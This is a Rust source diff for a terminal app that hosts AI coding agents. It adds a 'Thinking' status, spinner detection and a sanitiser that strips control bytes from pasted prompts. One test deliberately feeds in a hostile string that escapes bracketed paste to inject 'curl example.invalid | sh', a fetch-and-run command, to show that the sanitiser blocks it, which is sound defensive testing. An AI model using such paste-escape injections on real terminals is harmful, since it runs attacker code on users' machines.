@@ -34,6 +34,9 @@ actions!(terminal, [Copy, Paste, Clear, SelectAll]);
 const CURSOR_BLINK_INTERVAL: Duration = Duration::from_millis(530);
 const SPAWN_FALLBACK_DELAY: Duration = Duration::from_millis(400);
 const PROBE_INTERVAL: Duration = Duration::from_secs(1);
+/// Probes (one per second) of a silent screen after which an open turn is treated as over, so a
+/// missing Stop hook cannot leave a pane saying "Thinking…" for the rest of the day.
+const THINKING_GIVES_UP_TICKS: u8 = 90;
 
 thread_local! {
     static LAST_GRID: std::cell::Cell<GridSize> = const { std::cell::Cell::new(GridSize { columns: 120, lines: 36, cell_width: 8, cell_height: 16 }) };
@@ -75,8 +78,13 @@ pub enum NoticeKind {
 /// What an agent in this pane is doing, from its hooks and what its screen shows.
 #[derive(Debug, Clone, PartialEq)]
 pub enum AgentStatus {
+    /// The turn is over: the agent is waiting for the next prompt.
     Idle,
+    /// A turn is running: the agent's screen says so, or a hook reported it.
     Working,
+    /// A turn is open (a prompt was submitted, no stop yet) but its screen shows no activity —
+    /// the agent is between tool calls, thinking. Never "idle": that would read as "done".
+    Thinking,
     Finished(Option<String>),
     /// Waiting for a tool approval (the text names the tool / command).
     Permission(Option<String>),
@@ -87,6 +95,11 @@ pub enum AgentStatus {
 }
 
 impl AgentStatus {
+    /// A turn is running (thinking counts): don't interrupt, and don't call it idle.
+    pub fn in_turn(&self) -> bool {
+        matches!(self, AgentStatus::Working | AgentStatus::Thinking)
+    }
+
     pub fn needs_user(&self) -> bool {
         matches!(self, AgentStatus::Permission(_) | AgentStatus::Question(_))
     }
@@ -132,6 +145,15 @@ pub fn classify_screen(lines: &[String]) -> ScreenState {
     for line in tail {
         let lower = line.to_lowercase();
         if lower.contains("esc to interrupt") && (lower.contains('·') || lower.contains('•') || lower.contains('(')) {
+            state.busy = true;
+        }
+        // "✻ Cultivating… (1m 36s · ↓ 5.6k tokens · still thinking)": a running turn even though
+        // newer Claude Code leaves the interrupt hint out of that line.
+        let spinner = line.trim_start().starts_with(['✻', '✳', '✢', '✽', '✶']);
+        let hint = lower.trim_end().rsplit_once('(').is_some_and(|(_, tail)| {
+            tail.ends_with(')') && (tail.contains("tokens") || tail.contains("thinking") || tail.contains("esc to interrupt"))
+        });
+        if spinner && hint && (lower.contains('·') || lower.contains('•')) {
             state.busy = true;
         }
         if has_yes_option && state.permission.is_none() {
@@ -515,7 +537,10 @@ impl TerminalView {
             if !matches!(self.status, AgentStatus::Question(_)) {
                 self.enter_waiting(AgentStatus::Question(None), NoticeKind::Question, None, cx);
             }
-        } else if matches!(self.status, AgentStatus::Working | AgentStatus::Permission(_) | AgentStatus::Question(_)) {
+        } else if matches!(
+            self.status,
+            AgentStatus::Working | AgentStatus::Thinking | AgentStatus::Permission(_) | AgentStatus::Question(_)
+        ) {
             self.quiet_ticks = self.quiet_ticks.saturating_add(1);
             let esc_recent = self.esc_at.is_some_and(|at| at.elapsed() < Duration::from_secs(20));
             // Esc early in a turn rewinds it without an "Interrupted" line; the transcript still says so.
@@ -526,19 +551,25 @@ impl TerminalView {
                 self.working_since = None;
                 self.esc_at = None;
             } else if self.quiet_ticks >= 4 {
-                // No busy hint and no prompt for a few seconds: the turn is over without a hook.
-                self.working_since = None;
                 if self.spec.kind == PaneKind::Shell && self.status == AgentStatus::Working {
                     // Started by hand, so no hooks will say so: report the finished turn here.
+                    self.working_since = None;
                     self.status = AgentStatus::Finished(None);
                     self.attention = true;
                     cx.emit(TerminalEvent::Notified { kind: NoticeKind::Finished, message: None });
-                } else {
+                } else if self.quiet_ticks >= THINKING_GIVES_UP_TICKS {
+                    // The Stop hook never came (a crash, a hook that was never installed). A pane
+                    // that has shown nothing for this long is not thinking about anything: say it
+                    // is waiting rather than leave "Thinking…" up forever.
                     self.status = AgentStatus::Idle;
+                } else {
+                    // Launched agents report the end of a turn with their Stop hook. Until it
+                    // arrives the turn is still open: the agent is thinking, not waiting for us.
+                    self.status = AgentStatus::Thinking;
                 }
             }
         }
-        if self.status != AgentStatus::Working {
+        if !self.status.in_turn() {
             self.working_since = None;
         }
         self.status != before
@@ -565,11 +596,14 @@ impl TerminalView {
         let cwd = self.display_cwd();
         let since = self.launched_at_ms;
         let task = cx.background_spawn(async move {
-            let id = known.or_else(|| match agent {
+            let recent = match agent {
                 agentty_bridge::model::Agent::Claude => agentty_bridge::claude::find_recent(&cwd, since),
                 agentty_bridge::model::Agent::Codex => agentty_bridge::codex::find_recent(&cwd, since),
                 _ => None,
-            })?;
+            };
+            // `/clear` and a resume fork the agent into a new transcript, so the id the pane
+            // launched with can stop growing: follow whichever file is still being written.
+            let id = agentty_bridge::live_session_id(agent, known, recent)?;
             let subagents =
                 if agent == agentty_bridge::model::Agent::Claude { agentty_bridge::claude::subagent_activity(&id) } else { (0, 0) };
             Some((id.clone(), agentty_bridge::session_stats(agent, &id), subagents))
@@ -633,7 +667,7 @@ impl TerminalView {
     /// Whether the agent is in the middle of a turn or waiting on the user, so a restart would
     /// lose work.
     pub fn is_busy(&self) -> bool {
-        matches!(self.status, AgentStatus::Working | AgentStatus::Permission(_) | AgentStatus::Question(_))
+        self.status.in_turn() || matches!(self.status, AgentStatus::Permission(_) | AgentStatus::Question(_))
     }
 
     /// Restarts a Claude tab with another advisor, resuming the same conversation (a session with
@@ -934,16 +968,14 @@ impl TerminalView {
     }
 
     pub fn insert_text(&mut self, text: &str) {
-        let bytes =
-            if self.mode().contains(TermMode::BRACKETED_PASTE) { format!("\x1b[200~{text}\x1b[201~") } else { text.replace('\n', " ") };
-        self.write_user_input(bytes.into_bytes());
+        let bytes = paste_payload(text, self.mode().contains(TermMode::BRACKETED_PASTE));
+        self.write_user_input(bytes);
     }
 
     /// Submits text to the program as if pasted and entered by the user.
     pub fn submit_prompt(&mut self, text: String, cx: &mut Context<Self>) {
         let bracketed = self.mode().contains(TermMode::BRACKETED_PASTE);
-        let payload = if bracketed { format!("\x1b[200~{text}\x1b[201~") } else { text.replace('\n', " ") };
-        self.write_user_input(payload.into_bytes());
+        self.write_user_input(paste_payload(&text, bracketed));
         if self.agent_kind() == Some(PaneKind::Codex) {
             self.status = AgentStatus::Working;
             self.working_since = Some(Instant::now());
@@ -1979,6 +2011,12 @@ mod screen_tests {
         assert!(classify_screen(&claude).busy);
         let codex = lines("• Working (5s • esc to interrupt)\n› ");
         assert!(classify_screen(&codex).busy);
+        // Newer Claude Code leaves the interrupt hint out while it thinks.
+        let thinking = lines("> fix the bug\n\n✻ Cultivating… (1m 36s · ↓ 5.6k tokens · still thinking)\n\n─────\n>");
+        assert!(classify_screen(&thinking).busy);
+        // A finished spinner line is not a running turn, and neither is ordinary prose.
+        assert!(!classify_screen(&lines("✻ Baked for 3s · done 9:19 AM\n>")).busy);
+        assert!(!classify_screen(&lines("* the reply used 5k tokens (roughly · half)\n>")).busy);
         let permission = lines(
             " Bash command\n   rm -rf target\n Do you want to proceed?\n ❯ 1. Yes\n   2. No, and tell Claude what to do differently (esc)",
         );
@@ -2008,6 +2046,23 @@ mod screen_tests {
 }
 
 /// xterm mouse report bytes. `button`: 0 left, 32 = motion with left held, 64/65 wheel up/down.
+/// Bytes for text Agentty types into a program (prompts from Session Flow, the Extensions page,
+/// plugins and `agentty://` links; dropped paths).
+///
+/// Control bytes are removed first, keeping newlines and tabs: an ESC inside the text would end the
+/// bracketed paste early, so everything after it would arrive as real keystrokes and run — the same
+/// reason a clipboard paste strips them. Without bracketed paste the text is kept on one line, so it
+/// is never submitted by a newline of its own.
+fn paste_payload(text: &str, bracketed: bool) -> Vec<u8> {
+    let cleaned: String =
+        text.replace("\r\n", "\n").replace('\r', "\n").chars().filter(|c| !c.is_control() || matches!(c, '\n' | '\t')).collect();
+    if bracketed {
+        format!("\x1b[200~{cleaned}\x1b[201~").into_bytes()
+    } else {
+        cleaned.replace('\n', " ").into_bytes()
+    }
+}
+
 fn mouse_report(button: u8, (column, row): (usize, usize), pressed: bool, sgr: bool) -> Option<Vec<u8>> {
     if sgr {
         let suffix = if pressed { 'M' } else { 'm' };
@@ -2021,7 +2076,26 @@ fn mouse_report(button: u8, (column, row): (usize, usize), pressed: bool, sgr: b
 
 #[cfg(test)]
 mod mouse_tests {
-    use super::mouse_report;
+    use super::{mouse_report, paste_payload};
+
+    #[test]
+    fn typed_text_cannot_escape_the_paste() {
+        // A prompt that tries to close the paste early and run a command.
+        let hostile = "note\x1b[201~\ncurl example.invalid | sh\n\x1b[200~rest";
+        let bracketed = String::from_utf8(paste_payload(hostile, true)).unwrap();
+        assert!(bracketed.starts_with("\x1b[200~") && bracketed.ends_with("\x1b[201~"));
+        assert_eq!(bracketed.matches('\x1b').count(), 2, "{bracketed:?}");
+        assert!(bracketed.contains("note[201~\ncurl example.invalid | sh\n[200~rest"));
+
+        // Without bracketed paste nothing may end a line by itself.
+        let plain = String::from_utf8(paste_payload("one\r\ntwo\rthree\nfour", false)).unwrap();
+        assert_eq!(plain, "one two three four");
+        assert!(!plain.contains('\r') && !plain.contains('\n'));
+
+        // Ordinary text (including tabs and non-ASCII) is untouched.
+        let ordinary = String::from_utf8(paste_payload("한글\tcode", true)).unwrap();
+        assert_eq!(ordinary, "\x1b[200~한글\tcode\x1b[201~");
+    }
 
     #[test]
     fn encodes_sgr_and_legacy_reports() {
